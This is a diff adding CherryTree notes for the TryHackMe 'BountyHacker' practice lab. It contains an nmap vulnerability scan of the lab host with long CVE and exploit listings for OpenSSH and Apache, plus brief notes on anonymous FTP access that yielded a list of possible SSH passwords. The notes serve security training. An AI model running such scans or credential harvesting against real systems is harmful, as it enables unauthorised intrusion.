@@ -1,0 +1,482 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="BountyHacker(TryHackme)" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1613910296" ts_lastsave="1613911689">
+    <node name="nmap" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1613910843" ts_lastsave="1613910844">
+      <rich_text>nmap -p21,22,80 10.10.82.20 -T4 -A --script vuln                  
+Starting Nmap 7.91 ( </rich_text>
+      <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
+      <rich_text> ) at 2021-02-21 07:22 EST
+Nmap scan report for 10.10.82.20
+Host is up (0.45s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+|_sslv2-drown: 
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:7.2p2: 
+|       PACKETSTORM:140070      7.8     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:140070">https://vulners.com/packetstorm/PACKETSTORM:140070</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09">https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EDB-ID:40888    7.8     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:40888">https://vulners.com/exploitdb/EDB-ID:40888</rich_text>
+      <rich_text>      *EXPLOIT*
+|       CVE-2016-8858   7.8     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-8858">https://vulners.com/cve/CVE-2016-8858</rich_text>
+      <rich_text>
+|       CVE-2016-6515   7.8     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-6515">https://vulners.com/cve/CVE-2016-6515</rich_text>
+      <rich_text>
+|       1337DAY-ID-26494        7.8     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-26494">https://vulners.com/zdt/1337DAY-ID-26494</rich_text>
+      <rich_text>        *EXPLOIT*
+|       SSV:92579       7.5     </rich_text>
+      <rich_text link="webs https://vulners.com/seebug/SSV:92579">https://vulners.com/seebug/SSV:92579</rich_text>
+      <rich_text>    *EXPLOIT*
+|       CVE-2016-10009  7.5     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-10009">https://vulners.com/cve/CVE-2016-10009</rich_text>
+      <rich_text>
+|       1337DAY-ID-26576        7.5     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-26576">https://vulners.com/zdt/1337DAY-ID-26576</rich_text>
+      <rich_text>        *EXPLOIT*
+|       SSV:92582       7.2     </rich_text>
+      <rich_text link="webs https://vulners.com/seebug/SSV:92582">https://vulners.com/seebug/SSV:92582</rich_text>
+      <rich_text>    *EXPLOIT*
+|       CVE-2016-10012  7.2     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-10012">https://vulners.com/cve/CVE-2016-10012</rich_text>
+      <rich_text>
+|       CVE-2015-8325   7.2     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2015-8325">https://vulners.com/cve/CVE-2015-8325</rich_text>
+      <rich_text>
+|       SSV:92580       6.9     </rich_text>
+      <rich_text link="webs https://vulners.com/seebug/SSV:92580">https://vulners.com/seebug/SSV:92580</rich_text>
+      <rich_text>    *EXPLOIT*
+|       CVE-2016-10010  6.9     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-10010">https://vulners.com/cve/CVE-2016-10010</rich_text>
+      <rich_text>
+|       1337DAY-ID-26577        6.9     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-26577">https://vulners.com/zdt/1337DAY-ID-26577</rich_text>
+      <rich_text>        *EXPLOIT*
+|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19">https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97">https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EDB-ID:46516    5.8     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:46516">https://vulners.com/exploitdb/EDB-ID:46516</rich_text>
+      <rich_text>      *EXPLOIT*
+|       CVE-2019-6111   5.8     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-6111">https://vulners.com/cve/CVE-2019-6111</rich_text>
+      <rich_text>
+|       SSV:91041       5.5     </rich_text>
+      <rich_text link="webs https://vulners.com/seebug/SSV:91041">https://vulners.com/seebug/SSV:91041</rich_text>
+      <rich_text>    *EXPLOIT*
+|       PACKETSTORM:140019      5.5     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:140019">https://vulners.com/packetstorm/PACKETSTORM:140019</rich_text>
+      <rich_text>      *EXPLOIT*
+|       PACKETSTORM:136234      5.5     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:136234">https://vulners.com/packetstorm/PACKETSTORM:136234</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F">https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138">https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330">https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EDB-ID:40858    5.5     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:40858">https://vulners.com/exploitdb/EDB-ID:40858</rich_text>
+      <rich_text>      *EXPLOIT*
+|       CVE-2016-3115   5.5     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-3115">https://vulners.com/cve/CVE-2016-3115</rich_text>
+      <rich_text>
+|       SSH_ENUM        5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/canvas/SSH_ENUM">https://vulners.com/canvas/SSH_ENUM</rich_text>
+      <rich_text>     *EXPLOIT*
+|       PACKETSTORM:150621      5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:150621">https://vulners.com/packetstorm/PACKETSTORM:150621</rich_text>
+      <rich_text>      *EXPLOIT*
+|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS">https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS</rich_text>
+      <rich_text>  *EXPLOIT*
+|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0">https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283">https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EDB-ID:45939    5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:45939">https://vulners.com/exploitdb/EDB-ID:45939</rich_text>
+      <rich_text>      *EXPLOIT*
+|       CVE-2018-15919  5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-15919">https://vulners.com/cve/CVE-2018-15919</rich_text>
+      <rich_text>
+|       CVE-2018-15473  5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-15473">https://vulners.com/cve/CVE-2018-15473</rich_text>
+      <rich_text>
+|       CVE-2017-15906  5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-15906">https://vulners.com/cve/CVE-2017-15906</rich_text>
+      <rich_text>
+|       CVE-2016-10708  5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-10708">https://vulners.com/cve/CVE-2016-10708</rich_text>
+      <rich_text>
+|       1337DAY-ID-31730        5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-31730">https://vulners.com/zdt/1337DAY-ID-31730</rich_text>
+      <rich_text>        *EXPLOIT*
+|       EDB-ID:45233    4.6     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:45233">https://vulners.com/exploitdb/EDB-ID:45233</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EDB-ID:40963    4.6     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:40963">https://vulners.com/exploitdb/EDB-ID:40963</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EDB-ID:40962    4.6     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:40962">https://vulners.com/exploitdb/EDB-ID:40962</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF">https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF">https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF</rich_text>
+      <rich_text>    *EXPLOIT*
+|       CVE-2020-14145  4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2020-14145">https://vulners.com/cve/CVE-2020-14145</rich_text>
+      <rich_text>
+|       CVE-2016-6210   4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-6210">https://vulners.com/cve/CVE-2016-6210</rich_text>
+      <rich_text>
+|       1337DAY-ID-25440        4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-25440">https://vulners.com/zdt/1337DAY-ID-25440</rich_text>
+      <rich_text>        *EXPLOIT*
+|       1337DAY-ID-25438        4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-25438">https://vulners.com/zdt/1337DAY-ID-25438</rich_text>
+      <rich_text>        *EXPLOIT*
+|       CVE-2019-6110   4.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-6110">https://vulners.com/cve/CVE-2019-6110</rich_text>
+      <rich_text>
+|       CVE-2019-6109   4.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-6109">https://vulners.com/cve/CVE-2019-6109</rich_text>
+      <rich_text>
+|       CVE-2018-20685  2.6     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-20685">https://vulners.com/cve/CVE-2018-20685</rich_text>
+      <rich_text>
+|       SSV:92581       2.1     </rich_text>
+      <rich_text link="webs https://vulners.com/seebug/SSV:92581">https://vulners.com/seebug/SSV:92581</rich_text>
+      <rich_text>    *EXPLOIT*
+|       CVE-2016-10011  2.1     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-10011">https://vulners.com/cve/CVE-2016-10011</rich_text>
+      <rich_text>
+|       PACKETSTORM:151227      0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:151227">https://vulners.com/packetstorm/PACKETSTORM:151227</rich_text>
+      <rich_text>      *EXPLOIT*
+|       PACKETSTORM:140261      0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:140261">https://vulners.com/packetstorm/PACKETSTORM:140261</rich_text>
+      <rich_text>      *EXPLOIT*
+|       PACKETSTORM:138006      0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:138006">https://vulners.com/packetstorm/PACKETSTORM:138006</rich_text>
+      <rich_text>      *EXPLOIT*
+|       PACKETSTORM:137942      0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:137942">https://vulners.com/packetstorm/PACKETSTORM:137942</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EDB-ID:46193    0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:46193">https://vulners.com/exploitdb/EDB-ID:46193</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EDB-ID:40136    0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:40136">https://vulners.com/exploitdb/EDB-ID:40136</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EDB-ID:40113    0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:40113">https://vulners.com/exploitdb/EDB-ID:40113</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EDB-ID:39569    0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:39569">https://vulners.com/exploitdb/EDB-ID:39569</rich_text>
+      <rich_text>      *EXPLOIT*
+|       1337DAY-ID-32009        0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-32009">https://vulners.com/zdt/1337DAY-ID-32009</rich_text>
+      <rich_text>        *EXPLOIT*
+|       1337DAY-ID-30937        0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-30937">https://vulners.com/zdt/1337DAY-ID-30937</rich_text>
+      <rich_text>        *EXPLOIT*
+|_      1337DAY-ID-10010        0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-10010">https://vulners.com/zdt/1337DAY-ID-10010</rich_text>
+      <rich_text>        *EXPLOIT*
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+| http-internal-ip-disclosure: 
+|_  Internal IP Leaked: 127.0.1.1
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       </rich_text>
+      <rich_text link="webs http://ha.ckers.org/slowloris/">http://ha.ckers.org/slowloris/</rich_text>
+      <rich_text>
+|_      </rich_text>
+      <rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</rich_text>
+      <rich_text>
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.18: 
+|       CVE-2017-7679   7.5     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-7679">https://vulners.com/cve/CVE-2017-7679</rich_text>
+      <rich_text>
+|       CVE-2017-7668   7.5     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-7668">https://vulners.com/cve/CVE-2017-7668</rich_text>
+      <rich_text>
+|       CVE-2017-3169   7.5     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-3169">https://vulners.com/cve/CVE-2017-3169</rich_text>
+      <rich_text>
+|       CVE-2017-3167   7.5     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-3167">https://vulners.com/cve/CVE-2017-3167</rich_text>
+      <rich_text>
+|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB">https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB</rich_text>
+      <rich_text>    *EXPLOIT*
+|       CVE-2019-0211   7.2     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-0211">https://vulners.com/cve/CVE-2019-0211</rich_text>
+      <rich_text>
+|       1337DAY-ID-32502        7.2     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-32502">https://vulners.com/zdt/1337DAY-ID-32502</rich_text>
+      <rich_text>        *EXPLOIT*
+|       CVE-2018-1312   6.8     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-1312">https://vulners.com/cve/CVE-2018-1312</rich_text>
+      <rich_text>
+|       CVE-2017-15715  6.8     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-15715">https://vulners.com/cve/CVE-2017-15715</rich_text>
+      <rich_text>
+|       CVE-2019-10082  6.4     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-10082">https://vulners.com/cve/CVE-2019-10082</rich_text>
+      <rich_text>
+|       CVE-2017-9788   6.4     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-9788">https://vulners.com/cve/CVE-2017-9788</rich_text>
+      <rich_text>
+|       CVE-2019-0217   6.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-0217">https://vulners.com/cve/CVE-2019-0217</rich_text>
+      <rich_text>
+|       EDB-ID:47689    5.8     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:47689">https://vulners.com/exploitdb/EDB-ID:47689</rich_text>
+      <rich_text>      *EXPLOIT*
+|       CVE-2020-1927   5.8     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2020-1927">https://vulners.com/cve/CVE-2020-1927</rich_text>
+      <rich_text>
+|       CVE-2019-10098  5.8     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-10098">https://vulners.com/cve/CVE-2019-10098</rich_text>
+      <rich_text>
+|       1337DAY-ID-33577        5.8     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-33577">https://vulners.com/zdt/1337DAY-ID-33577</rich_text>
+      <rich_text>        *EXPLOIT*
+|       CVE-2016-5387   5.1     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-5387">https://vulners.com/cve/CVE-2016-5387</rich_text>
+      <rich_text>
+|       SSV:96537       5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/seebug/SSV:96537">https://vulners.com/seebug/SSV:96537</rich_text>
+      <rich_text>    *EXPLOIT*
+|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED">https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED</rich_text>
+      <rich_text>   *EXPLOIT*
+|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D">https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355">https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355</rich_text>
+      <rich_text>    *EXPLOIT*
+|       EDB-ID:40909    5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:40909">https://vulners.com/exploitdb/EDB-ID:40909</rich_text>
+      <rich_text>      *EXPLOIT*
+|       CVE-2020-1934   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2020-1934">https://vulners.com/cve/CVE-2020-1934</rich_text>
+      <rich_text>
+|       CVE-2019-0220   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-0220">https://vulners.com/cve/CVE-2019-0220</rich_text>
+      <rich_text>
+|       CVE-2019-0196   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-0196">https://vulners.com/cve/CVE-2019-0196</rich_text>
+      <rich_text>
+|       CVE-2018-17199  5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-17199">https://vulners.com/cve/CVE-2018-17199</rich_text>
+      <rich_text>
+|       CVE-2018-17189  5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-17189">https://vulners.com/cve/CVE-2018-17189</rich_text>
+      <rich_text>
+|       CVE-2018-1333   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-1333">https://vulners.com/cve/CVE-2018-1333</rich_text>
+      <rich_text>
+|       CVE-2018-1303   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-1303">https://vulners.com/cve/CVE-2018-1303</rich_text>
+      <rich_text>
+|       CVE-2017-9798   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-9798">https://vulners.com/cve/CVE-2017-9798</rich_text>
+      <rich_text>
+|       CVE-2017-15710  5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2017-15710">https://vulners.com/cve/CVE-2017-15710</rich_text>
+      <rich_text>
+|       CVE-2016-8743   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-8743">https://vulners.com/cve/CVE-2016-8743</rich_text>
+      <rich_text>
+|       CVE-2016-8740   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-8740">https://vulners.com/cve/CVE-2016-8740</rich_text>
+      <rich_text>
+|       CVE-2016-4979   5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-4979">https://vulners.com/cve/CVE-2016-4979</rich_text>
+      <rich_text>
+|       1337DAY-ID-28573        5.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-28573">https://vulners.com/zdt/1337DAY-ID-28573</rich_text>
+      <rich_text>        *EXPLOIT*
+|       CVE-2019-0197   4.9     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-0197">https://vulners.com/cve/CVE-2019-0197</rich_text>
+      <rich_text>
+|       EDB-ID:47688    4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:47688">https://vulners.com/exploitdb/EDB-ID:47688</rich_text>
+      <rich_text>      *EXPLOIT*
+|       CVE-2020-11985  4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2020-11985">https://vulners.com/cve/CVE-2020-11985</rich_text>
+      <rich_text>
+|       CVE-2019-10092  4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2019-10092">https://vulners.com/cve/CVE-2019-10092</rich_text>
+      <rich_text>
+|       CVE-2018-1302   4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-1302">https://vulners.com/cve/CVE-2018-1302</rich_text>
+      <rich_text>
+|       CVE-2018-1301   4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-1301">https://vulners.com/cve/CVE-2018-1301</rich_text>
+      <rich_text>
+|       CVE-2018-11763  4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-11763">https://vulners.com/cve/CVE-2018-11763</rich_text>
+      <rich_text>
+|       CVE-2016-4975   4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-4975">https://vulners.com/cve/CVE-2016-4975</rich_text>
+      <rich_text>
+|       CVE-2016-1546   4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-1546">https://vulners.com/cve/CVE-2016-1546</rich_text>
+      <rich_text>
+|       1337DAY-ID-33575        4.3     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-33575">https://vulners.com/zdt/1337DAY-ID-33575</rich_text>
+      <rich_text>        *EXPLOIT*
+|       CVE-2018-1283   3.5     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2018-1283">https://vulners.com/cve/CVE-2018-1283</rich_text>
+      <rich_text>
+|       CVE-2016-8612   3.3     </rich_text>
+      <rich_text link="webs https://vulners.com/cve/CVE-2016-8612">https://vulners.com/cve/CVE-2016-8612</rich_text>
+      <rich_text>
+|       PACKETSTORM:152441      0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/packetstorm/PACKETSTORM:152441">https://vulners.com/packetstorm/PACKETSTORM:152441</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EDB-ID:46676    0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:46676">https://vulners.com/exploitdb/EDB-ID:46676</rich_text>
+      <rich_text>      *EXPLOIT*
+|       EDB-ID:42745    0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/exploitdb/EDB-ID:42745">https://vulners.com/exploitdb/EDB-ID:42745</rich_text>
+      <rich_text>      *EXPLOIT*
+|       1337DAY-ID-663  0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-663">https://vulners.com/zdt/1337DAY-ID-663</rich_text>
+      <rich_text>  *EXPLOIT*
+|       1337DAY-ID-601  0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-601">https://vulners.com/zdt/1337DAY-ID-601</rich_text>
+      <rich_text>  *EXPLOIT*
+|       1337DAY-ID-4533 0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-4533">https://vulners.com/zdt/1337DAY-ID-4533</rich_text>
+      <rich_text> *EXPLOIT*
+|       1337DAY-ID-3109 0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-3109">https://vulners.com/zdt/1337DAY-ID-3109</rich_text>
+      <rich_text> *EXPLOIT*
+|_      1337DAY-ID-2237 0.0     </rich_text>
+      <rich_text link="webs https://vulners.com/zdt/1337DAY-ID-2237">https://vulners.com/zdt/1337DAY-ID-2237</rich_text>
+      <rich_text> *EXPLOIT*
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Sony X75CH-series Android TV (Android 5.0) (86%), Linux 2.6.32 (86%), Linux 3.2 - 4.9 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   194.16 ms 10.4.0.1
+2   ... 3
+4   449.90 ms 10.10.82.20
+
+OS and Service detection performed. Please report any incorrect results at </rich_text>
+      <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+      <rich_text> .
+Nmap done: 1 IP address (1 host up) scanned in 345.87 seconds
+                                                              </rich_text>
+    </node>
+    <node name="ftp" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1613910856" ts_lastsave="1613910877">
+      <rich_text>Anonymous login allowed.connected to ftp server and then changed the user to anonymous then used “dir” to list files.Got
+a list of possible ssh passwords
+</rich_text>
+    </node>
+    <node name="mynotes" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1613910866" ts_lastsave="1613911697">
+      <rich_text>1- POrt 21,22,80 open
+2- Web enumaration going while i login to ftp
+3- ANonymous access allowed on ftp server and i found list of passwords .
